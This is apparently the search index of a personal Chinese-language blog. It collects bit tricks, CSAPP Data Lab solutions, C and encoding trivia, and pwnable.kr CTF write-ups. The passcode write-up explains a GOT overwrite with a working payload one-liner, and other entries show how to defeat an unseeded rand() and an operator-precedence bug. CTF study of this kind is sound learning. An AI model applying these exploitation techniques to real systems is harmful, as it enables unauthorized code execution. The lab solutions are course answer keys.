[{"categories":null,"content":" pwnable.kr python速成 csapp Data Lab 第三章 第二章家庭作业 zsh的使用? tmux又是什么? 温习? Vim symbolic link? ","date":"2022-10-17","objectID":"/tolearn/:0:0","tags":null,"title":"ToLearnList","uri":"/tolearn/"},{"categories":null,"content":"收录遇到的各种奇技淫巧 位运算转换大小写 转小写 ('a' | ' ') = 'a' ('A' | ' ') = 'a' 转大写 ('b' \u0026 '_') = 'B' ('B' \u0026 '_') = 'B' 大小写互换 ('c' ^ ' ') = 'C' ('C' ^ ' ') = 'C' 原理: ' ' = 20 = 0b00100000 '_' = 95 = 0b01011111 'A' = 65 = 0b01000001 'a' = 97 = 0b01100001 'A' - 'a' = 20 = ' ' = 0b00100000 可以看到二进制ASCII码A与a差的就是100000, 其代表的是’ ‘, 所以进行一个或运算可以将大写字母第5位的0变成1而不影响别的位, 小写字母不变. 同理, 与’A’进行与运算可以将小写字母的第6-8位从011变成大写字母的010, 而由于’_‘的0-5位全为1, 进行与运算不会影响这几位. 又同理, 将字母与’ ‘进行异或会将第5位的1变成0, 0变成1, 即可实现大小写互换. 总之, 小写字母与大写字母相差32 = 2^5,只要操控第5位即可转换大小写. 大写字母与小写字母中间多的六个字符想必不是巧合, 而是设计时的有意为之. ","date":"2022-10-15","objectID":"/tricks/:0:0","tags":null,"title":"奇技淫巧","uri":"/tricks/"},{"categories":null,"content":"环境准备 WSL2(Ubuntu22.04) + VSCode apt-get update sudo apt-get install build-essential sudo apt-get install gcc-multilib sudo apt-get install gdb ","date":"2022-10-15","objectID":"/csapp_lab/:1:0","tags":["CSAPP"],"title":"Csapp_lab","uri":"/csapp_lab/"},{"categories":null,"content":"Data Lab ","date":"2022-10-15","objectID":"/csapp_lab/:2:0","tags":["CSAPP"],"title":"Csapp_lab","uri":"/csapp_lab/"},{"categories":null,"content":"食用方法 阅读README获得完整信息 按照bits.c文件的注释修改bits.c 使用./dlc bits.c 检查代码是否符合标准, 若符合则无输出. ./dlc -e bits.c查看用了多少操作符 每次修改bits.c后 执行make clean \u0026\u0026 make btest编译测试工具 执行./btest检查正确性,./btest -f foo可以单独检查某个函数的正确性 运行./driver.pl打分 ","date":"2022-10-15","objectID":"/csapp_lab/:2:1","tags":["CSAPP"],"title":"Csapp_lab","uri":"/csapp_lab/"},{"categories":null,"content":"题目 bitXor 只使用~和\u0026实现^ a ^ b = (a | b) \u0026 (~a | ~b) = ~(~a \u0026 ~b) \u0026 (a \u0026 b) = (a \u0026 ~b) | (~a \u0026 b) //1 /* * bitXor - x^y using only ~ and \u0026 * Example: bitXor(4, 5) = 1 * Legal ops: ~ \u0026 * Max ops: 14 * Rating: 1 */ int bitXor(int x, int y) { return ~(~(x \u0026 ~ y) \u0026 ~(~x \u0026 y)); } tmin /* * tmin - return minimum two's complement integer * Legal ops: ! ~ \u0026 ^ | + \u003c\u003c \u003e\u003e * Max ops: 4 * Rating: 1 */ int tmin(void) { return 1 \u003c\u003c 31; } isTmax 最大值x应该是第一位为0, 其它位都为1, 则x+1 = ~x. 但是由于所有位都为1的-1+1之后进位的0会溢出消失, 所以-1 + 1 = ~(-1)需要特判, 只需特判~x是否为0, 即(!!~x) //2 /* * isTmax - returns 1 if x is the maximum, two's complement number, * and 0 otherwise * Legal ops: ! ~ \u0026 ^ | + * Max ops: 10 * Rating: 1 */ int isTmax(int x) { return !((x+1)^(~x))\u0026(!!~x); } allOddBits negate 返回-x x + (-x) = 0 x + ~x = 0xffffffff(所有位全为1) x + ~x + 1 = 0 -x = ~x + 1 /* * negate - return -x * Example: negate(1) = -1. * Legal ops: ! ~ \u0026 ^ | + \u003c\u003c \u003e\u003e * Max ops: 5 * Rating: 2 */ int negate(int x) { return ~x+1; } ","date":"2022-10-15","objectID":"/csapp_lab/:2:2","tags":["CSAPP"],"title":"Csapp_lab","uri":"/csapp_lab/"},{"categories":null,"content":"CSAPP第二章家庭作业2.65 /*Return 1 when x contains an odd number of 1s; 0 otherwise. Assume w=32 */ int odd_ones(unsigned x) 函数应该遵循位级整数编码规则,你的代码最多只能包含12个算术运算,位运算和逻辑运算. ","date":"2022-10-12","objectID":"/odd_ones/:0:0","tags":null,"title":"二进制数中1的个数是否为奇数","uri":"/odd_ones/"},{"categories":null,"content":"代码 先上个代码 int odd_ones(unsigned x) { x ^= x \u003e\u003e 16; x ^= x \u003e\u003e 8; x ^= x \u003e\u003e 4; x ^= x \u003e\u003e 2; x ^= x \u003e\u003e 1; return x \u0026 1; //http://stackoverflow.com/a/9133406 } 在使用循环的情况下就可以不用预先知道int的位数是多少,如下 int odd_ones(unsigned x) { int w = sizeof(x) * 8;//获得x有多少位二进制位,这里是32 int n = 1; while(n \u003c w) { x ^= (x \u003e\u003e n); n \u003c\u003c= 1; } return x \u0026 1; } ","date":"2022-10-12","objectID":"/odd_ones/:1:0","tags":null,"title":"二进制数中1的个数是否为奇数","uri":"/odd_ones/"},{"categories":null,"content":"原理 由于异或的性质, 可以反映异或对应位上1的个数. 例: 0 ^ 0 = 0, 0 ^ 1 = 1, 1 ^ 1 = 0. 即只有两位中有奇数个(1个)1的时候, 该位的异或值为1.也就是我们用异或结果的一个位压缩了进行异或的两位的1的个数. 依照这个思想我们可以先写出一个简单的版本: int odd_ones(unsigned x) { unsigned s = x \u003e\u003e 1; while(x) { x ^= s; s \u003e\u003e= 1; } return x \u0026 1; } 我们设最右侧一位为第0位,最左侧一位为第w位, 即x第0位一开始代表第0位的1是否为奇数个,一次异或后变为第0和第1位的1是否位奇数个, 然后是第0~2位中的1是否为奇数个… 经过w-1次移位, 第0位代表第0~w-1位的1总共是否为奇数个, 此时返回x\u00261即可. 但我们发现这样移位一次只利用了每次第0位的异或结果, 有优化空间. 我们可以同时利用多个异或结果, 并且这些异或结果所代表的位不能重叠.(因为最后需要有一位代表0~w-1位中1的个数, 若有重叠就会导致某一位多计算一次). 那么最大化且不重叠的利用办法就是一次右移一半, 像将这个数字\"对折\"一样. 此时的异或结果中0~w/2-1位中每一位分别代表第i位和第i+w/2-1位中1的个数是否为奇数. 每次右移一半直到只剩一位, 我们只需进行$log_2w$次异或和右移运算.代码见开头. ","date":"2022-10-12","objectID":"/odd_ones/:2:0","tags":null,"title":"二进制数中1的个数是否为奇数","uri":"/odd_ones/"},{"categories":null,"content":"用于记录一些比较奇怪/少见的c语法/易错易忘点, 以备考试等用途 编译没过先看报错信息, 不认识英文请善用翻译 带缺省值的参数需要放在后面, 这样在调用函数的时候就可以不写那个参数. 放在前面编译会报错. int f(int b, int a = 0); // right int f(int a = 0, int b); // wrong 字符串占用的空间要算上 ‘\\0’ 关于锟斤拷烫烫烫等成因: 手持两把锟斤拷，口中疾呼烫烫烫,脚踏千朵屯屯屯，笑看万物锘锘锘 锟斤拷 源于GBK字符集和Unicode字符集之间的转换问题。Unicode和老编码体系的转化过程中，肯定有一些字，用Unicode是没法表示的，Unicode官方用了一个占位符来表示这些文字，这就是：U+FFFD REPLACEMENT CHARACTER。那么U+FFFD的UTF-8编码出来，恰好是 ‘\\xef\\xbf\\xbd’。如果这个’\\xef\\xbf\\xbd’，重复多次，例如 ‘\\xef\\xbf\\xbd\\xef\\xbf\\xbd’，然后放到GBK/CP936/GB2312/GB18030的环境中显示的话，一个汉字2个字节，最终的结果就是：锟斤拷——锟(0xEFBF)，斤（0xBDEF），拷（0xBFBD）。 烫烫烫 VS/VC debug模式下栈内未初始化的内存会全部被设置成0xcc, 这个0xcc是INT3中断指令, 所以执行这块内存就会中断程序. VS调试器默认字符集是MBCS, 其中0xcccc是’烫’字, 所以…… INT3断点是断点的一种，在诸如Ollydbg中的快捷键是F2，是一种很常用的断点类型。INT3指令的机器码为CC，所以通常也称之为CC指令。当被调试进程执行INT3指令导致一个异常时，调试器就会捕捉这个异常从而停在断点处，然后将断点处的指令恢复成原来的指令。当然，如果自己写调试器，也可以用其他一些指令代替INT3指令来触发异常。。 屯屯屯 由于相似的原因, 堆中空间的缺省值是0xcd, 也是一个中断指令的机器码, 0xcdcd是屯 锘锘锘 BOM 是 Byte Order Mark 的缩写。是UTF编码方案里用于标识编码的标准标记，在UTF-16里本来是FF FE，变成UTF-8就成了EF BB BF。这个标记是可选的，因为UTF8字节没有顺序，所以它可以被用来检测一个字节流是否是UTF-8编码的。 常见原因是在记事本里保存了代码, 因为记事本用utf-8编码, 而且保存自动加BOM 锘EFBB 匡BFEF 豢BBBF 葺葺葺 虽然诗里没有, 但堆上申请后释放空间后缺省值是0xdd, 0xdddd是葺 ","date":"2022-10-12","objectID":"/c/:0:0","tags":null,"title":"C八股","uri":"/c/"},{"categories":null,"content":"JuicyMio 前OIer 现尝试学习CTF 邮箱:guanhyjuicymio@gmail.com ","date":"2022-10-12","objectID":"/about/:0:0","tags":null,"title":"About","uri":"/about/"},{"categories":null,"content":"pwnable.kr writeup python3中使用p32, p64需要进行编码 payload +=p64(1926).decode(\"iso-8859-1\") ","date":"2022-10-12","objectID":"/pwnable.kr/:0:0","tags":["pwn"],"title":"Pwnable.kr","uri":"/pwnable.kr/"},{"categories":null,"content":"1 fd 文件描述符(file descricptor) 维基百科：文件描述符在形式上是一个非负整数。实际上，它是一个索引值，指向内核为每一个进程所维护的该进程打开文件的记录表。当程序打开一个现有文件或者创建一个新文件时，内核向进程返回一个文件描述符。在程序设计中，一些涉及底层的程序编写往往会围绕着文件描述符展开。 习惯上 标准输入(stdin)为0, 标准输出(stdout)为1, 标准错误(stderr)为2. //fd.c #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e #include \u003cstring.h\u003e char buf[32]; int main(int argc, char* argv[], char* envp[]){ if(argc\u003c2){ printf(\"pass argv[1] a number\\n\"); return 0; } int fd = atoi( argv[1] ) - 0x1234; int len = 0; len = read(fd, buf, 32); if(!strcmp(\"LETMEWIN\\n\", buf)){ printf(\"good job :)\\n\"); system(\"/bin/cat flag\"); exit(0); } printf(\"learn about Linux file IO\\n\"); return 0; } 得到flag的关键在于如歌通过第二个if语句, 也就是如何让buf=LETMEMIN 可以看到read从fd中读入32个字节为buf赋值, 如果我们想控制buf的值就要控制fd中的内容, 那么只要让fd=0, 再向标准输入(从命令行直接输入)中输入LETMEWIN就可以了. 注意到fd在此处赋值: int fd = atoi( argv[1] ) - 0x1234; 其中atoi是将字符串转化为整数的函数 int main(int argc, char* argv[], char* envp[]){ 可以看到argv[]是main函数的一个参数, 而main函数的参数都是程序运行时在命令行输入的, argc代表输入参数的个数(第一个参数是程序路径), argv则存储着指向这些参数的指针. envp存储指向环境变量的指针, 此处没用到. 例如运行程序fd ./fd 4660 此时argc值为2, 而argv[0] = “./fd”, argv[1] = “4660” atoi不能转化16进制数, 所以我们手动转换0x1234, 它的十进制表示是4660 这样我们就可以让fd = 0, 程序等待从stdin中读取字符 我们再向命令行中输入LETMEWIN, 即可得到flag ","date":"2022-10-12","objectID":"/pwnable.kr/:1:0","tags":["pwn"],"title":"Pwnable.kr","uri":"/pwnable.kr/"},{"categories":null,"content":"2 collision ","date":"2022-10-12","objectID":"/pwnable.kr/:2:0","tags":["pwn"],"title":"Pwnable.kr","uri":"/pwnable.kr/"},{"categories":null,"content":"5 passcode 这题没太懂GOT PLT那里的具体原理 #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e void login(){ int passcode1; int passcode2; printf(\"enter passcode1 : \"); scanf(\"%d\", passcode1); fflush(stdin); // ha! mommy told me that 32bit is vulnerable to bruteforcing :) printf(\"enter passcode2 : \"); scanf(\"%d\", passcode2); printf(\"checking...\\n\"); if(passcode1==338150 \u0026\u0026 passcode2==13371337){ printf(\"Login OK!\\n\"); system(\"/bin/cat flag\"); } else{ printf(\"Login Failed!\\n\"); exit(0); } } void welcome(){ char name[100]; printf(\"enter you name : \"); scanf(\"%100s\", name); printf(\"Welcome %s!\\n\", name); } int main(){ printf(\"Toddler's Secure Login System 1.0 beta.\\n\"); welcome(); login(); // something after login... printf(\"Now I can safely trust you that you have credential :)\\n\"); return 0; } 容易注意到login函数中这句 scanf(\"%d\", passcode1); 本应该为 scanf(\"%d\", \u0026passcode1); 也就是说scanf本该向passcode1所在地址写入内容, 却变成了将passcode1中存入的数作为地址, 向其写入内容. 这给了我们可乘之机, 如果能够覆盖passcode1的内容, 就可以向这个地址写入内容. 那么如何修改passcode1呢? 自然我们要看在其之前执行的welcome函数, 它读入了100个字符. 用IDA反编译一下 int login() { int v1; // [esp+18h] [ebp-10h] int v2; // [esp+1Ch] [ebp-Ch] printf(\"enter passcode1 : \"); __isoc99_scanf(\"%d\", v1); fflush(stdin); printf(\"enter passcode2 : \"); __isoc99_scanf(\"%d\", v2); puts(\"checking...\"); if ( v1 != 338150 || v2 != 13371337 ) { puts(\"Login Failed!\"); exit(0); } puts(\"Login OK!\"); return system(\"/bin/cat flag\"); } unsigned int welcome() { char v1[100]; // [esp+18h] [ebp-70h] BYREF unsigned int v2; // [esp+7Ch] [ebp-Ch] v2 = __readgsdword(0x14u); printf(\"enter you name : \"); __isoc99_scanf(\"%100s\", v1); printf(\"Welcome %s!\\n\", v1); return __readgsdword(0x14u) ^ v2; } 由于welcome和login紧挨着先后执行, 那么代表栈底的ebp应该没有改变. login中的v1即passcode1在ebp-10h的位置, welcome中的v1即name在ebp-70h的位置, 70h-10h = 60h = 96. 也就是他们位置相差96字节, 而我们可以输入100个字节, 这多出的4个字节就正好可以覆盖passcode1. 如果把passcode1覆盖成printf函数的GOT,再在scanf向passcode1内的地址, 即我们覆盖的printf的GOT写入时输入system的GOT, 就可以将即将执行的printf变成system(\"/bin/cat flag\")这个指令了. 在IDA里找到他们: .plt:08048420 .plt:08048420 ; =============== S U B R O U T I N E ======================================= .plt:08048420 .plt:08048420 ; Attributes: thunk .plt:08048420 .plt:08048420 ; int printf(const char *format, ...) .plt:08048420 _printf proc near ; CODE XREF: login+E↓p .plt:08048420 ; login+3C↓p ... .plt:08048420 .plt:08048420 format = dword ptr 4 .plt:08048420 .plt:08048420 jmp ds:off_804A000 .plt:08048420 _printf endp .plt:08048420 .text:08048562 ; --------------------------------------------------------------------------- .text:08048563 align 4 .text:08048564 .text:08048564 ; =============== S U B R O U T I N E ======================================= .text:08048564 .text:08048564 ; Attributes: bp-based frame .text:08048564 .text:08048564 public login .text:08048564 login proc near ; CODE XREF: main+1A↓p .text:08048564 .text:08048564 var_10 = dword ptr -10h .text:08048564 var_C = dword ptr -0Ch .text:08048564 .text:08048564 ; __unwind { .text:08048564 push ebp .text:08048565 mov ebp, esp .text:08048567 sub esp, 28h .text:0804856A mov eax, offset format ; \"enter passcode1 : \" .text:0804856F mov [esp], eax ; format .text:08048572 call _printf .text:08048577 mov eax, offset aD ; \"%d\" .text:0804857C mov edx, [ebp+var_10] .text:0804857F mov [esp+4], edx .text:08048583 mov [esp], eax .text:08048586 call ___isoc99_scanf .text:0804858B mov eax, ds:stdin@@GLIBC_2_0 .text:08048590 mov [esp], eax ; stream .text:08048593 call _fflush .text:08048598 mov eax, offset aEnterPasscode2 ; \"enter passcode2 : \" .text:0804859D mov [esp], eax ; format .text:080485A0 call _printf .text:080485A5 mov eax, offset aD ; \"%d\" .text:080485AA mov edx, [ebp+var_C] .text:080485AD mov [esp+4], edx .text:080485B1 mov [esp], eax .text:080485B4 call ___isoc99_scanf .text:080485B9 mov dword ptr [esp], offset s ; \"checking...\" .text:080485C0 call _puts .text:080485C5 cmp [ebp+var_10], 528E6h .text:080485CC jnz short loc_80485F1 .text:080485CE cmp [ebp+var_C], 0CC07C9h .text:080485D5 jnz short loc_80485F1 .text:080485D7 mov dword ptr [esp], offset a","date":"2022-10-12","objectID":"/pwnable.kr/:3:0","tags":["pwn"],"title":"Pwnable.kr","uri":"/pwnable.kr/"},{"categories":null,"content":"实现: python -c 'print \"A\"*96+\"\\x00\\xa0\\x04\\x08\"+\"134514147\\n\"' | ./passcode ","date":"2022-10-12","objectID":"/pwnable.kr/:3:1","tags":["pwn"],"title":"Pwnable.kr","uri":"/pwnable.kr/"},{"categories":null,"content":"6 random #include \u003cstdio.h\u003e int main(){ unsigned int random; random = rand(); // random value! unsigned int key=0; scanf(\"%d\", \u0026key); if( (key ^ random) == 0xdeadbeef ){ printf(\"Good!\\n\"); system(\"/bin/cat flag\"); return 0; } printf(\"Wrong, maybe you should try 2^32 cases.\\n\"); return 0; } 注意到rand()没有用srand()设定种子, 那么种子默认为1, 生成的随机数应该是一个固定的序列. 我们在本地编译, 用gdb调试该程序, 得到random的值为1804289383. 而key^random的值应该是0xdeadbeef, 由于^的逆运算是它本身, deadbeef^random=key. 算出key = -1255736440, 运行random程序输入key得到flag random@pwnable:~$ ./random -1255736440 Good! Mommy, I thought libc random is unpredictable... ","date":"2022-10-12","objectID":"/pwnable.kr/:4:0","tags":["pwn"],"title":"Pwnable.kr","uri":"/pwnable.kr/"},{"categories":null,"content":"7 input ","date":"2022-10-12","objectID":"/pwnable.kr/:5:0","tags":["pwn"],"title":"Pwnable.kr","uri":"/pwnable.kr/"},{"categories":null,"content":"8 leg ","date":"2022-10-12","objectID":"/pwnable.kr/:6:0","tags":["pwn"],"title":"Pwnable.kr","uri":"/pwnable.kr/"},{"categories":null,"content":"9 mistake We all make mistakes, let's move on. (don't take this too seriously, no fancy hacking skill is required at all) This task is based on real event Thanks to dhmonkey hint : operator priority ssh mistake@pwnable.kr -p2222 (pw:guest) 提示是操作符的优先级 #include \u003cstdio.h\u003e #include \u003cfcntl.h\u003e #define PW_LEN 10 #define XORKEY 1 void xor(char* s, int len){ int i; for(i=0; i\u003clen; i++){ s[i] ^= XORKEY; } } int main(int argc, char* argv[]){ int fd; if(fd=open(\"/home/mistake/password\",O_RDONLY,0400) \u003c 0){ printf(\"can't open password %d\\n\", fd); return 0; } printf(\"do not bruteforce...\\n\"); sleep(time(0)%20); char pw_buf[PW_LEN+1]; int len; if(!(len=read(fd,pw_buf,PW_LEN) \u003e 0)){ printf(\"read error\\n\"); close(fd); return 0; } char pw_buf2[PW_LEN+1]; printf(\"input password : \"); scanf(\"%10s\", pw_buf2); // xor your input xor(pw_buf2, 10); if(!strncmp(pw_buf, pw_buf2, PW_LEN)){ printf(\"Password OK\\n\"); system(\"/bin/cat flag\\n\"); } else{ printf(\"Wrong Password\\n\"); } close(fd); return 0; } 观察这一行 if(fd=open(\"/home/mistake/password\",O_RDONLY,0400) \u003c 0){ 乍一看没什么不对, 当返回的文件描述符小于0时报错 但是\u003c是比=优先级高的, 所以事实上首先open()会返回1, 然后执行1\u003c0这个表达式, 它的值是0. 最后执行fd=0, 由第一题fd我们学到了fd = 0是stdin. 所以事实上password是我们输入的. 然后我们再来看xor这个函数, 它将一个字符串的前n个字符与1异或. 题目中给出的是前10个字符. 所以我们只需要先输入10个字符作为password, 再输入这些字符异或1得到的字符串. 由于字符'0’的ascii码为110000, 字符'1’的ascii码为110001, 恰好'0’^1 = ‘1’. 所以只需进行如下操作 ./mistake do not bruteforce... 0000000000 1111111111input password : Password OK Mommy, the operator priority always confuses me :( ","date":"2022-10-12","objectID":"/pwnable.kr/:7:0","tags":["pwn"],"title":"Pwnable.kr","uri":"/pwnable.kr/"}]